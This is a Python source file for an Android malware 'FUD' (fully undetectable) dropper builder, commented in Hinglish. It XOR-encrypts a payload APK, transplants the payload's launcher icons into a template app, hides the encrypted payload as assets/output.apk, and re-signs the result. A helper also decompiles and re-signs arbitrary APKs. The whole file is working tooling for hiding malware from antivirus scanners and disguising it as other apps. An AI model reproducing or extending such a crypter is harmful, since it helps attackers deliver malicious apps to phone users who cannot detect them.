"""FUD pipeline — XOR encrypt + icon swap + sign."""
import os
import shutil
import time
import zipfile

from config import PAYLOAD_XOR_KEY
from setup import ensure_tools
from apktool_wrapper import decompile, recompile
from signer import sign_apk


def _step(session_dir, msg):
    try:
        with open(os.path.join(session_dir, "step.txt"), "w") as f:
            f.write(msg)
    except Exception:
        pass
    print(f"\n===== {msg} ===== t={time.time():.0f}", flush=True)


def _xor_bytes(data: bytes, key: bytes) -> bytes:
    klen = len(key)
    out = bytearray(len(data))
    for i, b in enumerate(data):
        out[i] = b ^ key[i % klen]
    return bytes(out)


def _extract_icons(payload_apk: str):
    """payload APK me se ic_launcher images nikaalo."""
    icons = {}
    try:
        with zipfile.ZipFile(payload_apk, "r") as z:
            for n in z.namelist():
                ln = n.lower()
                # sirf launcher icons
                if not n.startswith("res/"):
                    continue
                if "ic_launcher" not in ln:
                    continue
                if not ln.endswith((".png", ".webp", ".jpg", ".jpeg")):
                    continue
                try:
                    icons[n] = z.read(n)
                except Exception:
                    pass
            # fallback: koi bhi mipmap icon
            if not icons:
                for n in z.namelist():
                    ln = n.lower()
                    if n.startswith("res/mipmap") and ln.endswith((".png", ".webp")):
                        try:
                            icons[n] = z.read(n)
                        except Exception:
                            pass
    except Exception:
        pass
    return icons


def full_fud_pipeline_dropper(template_apk: str, payload_apk: str,
                              output_apk: str, session_dir: str) -> str:
    _step(session_dir, "ensure_tools")
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    if not os.path.exists(template_apk):
        raise RuntimeError("template missing")

    _step(session_dir, "1/3 read + encrypt payload")
    with open(payload_apk, "rb") as f:
        payload_bytes = f.read()
    encrypted = _xor_bytes(payload_bytes, PAYLOAD_XOR_KEY)
    print(f"[✓] payload {len(payload_bytes)} bytes → XOR encrypted", flush=True)

    _step(session_dir, "2/3 icon swap")
    icons = _extract_icons(payload_apk)
    print(f"[i] found {len(icons)} icon files in payload", flush=True)

    _step(session_dir, "3/3 inject + sign")
    unsigned = os.path.join(session_dir, "unsigned.apk")

    with zipfile.ZipFile(template_apk, "r") as zin, \
         zipfile.ZipFile(unsigned, "w", zipfile.ZIP_DEFLATED) as zout:

        template_names = set(zin.namelist())

        for item in zin.infolist():
            fn = item.filename

            if fn.startswith("META-INF/"):
                continue
            if fn == "assets/output.apk":
                continue

            # icon replace agar path template me bhi hai
            if fn in icons:
                zout.writestr(item, icons[fn])
                continue

            try:
                data = zin.read(fn)
            except Exception:
                continue

            if fn.endswith(".dex") or fn == "resources.arsc" or fn == "AndroidManifest.xml":
                zout.writestr(item, data, compress_type=zipfile.ZIP_STORED)
            else:
                zout.writestr(item, data)

        # agar payload ke icons ka path template me nahi hai, tab bhi add karo
        for fn, data in icons.items():
            if fn not in template_names:
                zout.writestr(fn, data)

        # encrypted payload → assets/output.apk
        info = zipfile.ZipInfo("assets/output.apk")
        info.compress_type = zipfile.ZIP_STORED
        zout.writestr(info, encrypted)

    print(f"[✓] encrypted payload embedded → assets/output.apk", flush=True)

    sign_apk(unsigned, output_apk)
    _step(session_dir, "done")
    print(f"[✓] DROPPER DONE → {output_apk}", flush=True)
    return output_apk


# agar kabhi template ke bina use karna ho
def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
    _step(session_dir, "ensure_tools")
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    _step(session_dir, "1/3 decompile")
    decompiled = os.path.join(session_dir, "decompiled")
    decompile(input_apk, decompiled)

    _step(session_dir, "2/3 recompile")
    unsigned = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled, unsigned)

    _step(session_dir, "3/3 sign")
    sign_apk(unsigned, output_apk)
    return output_apk
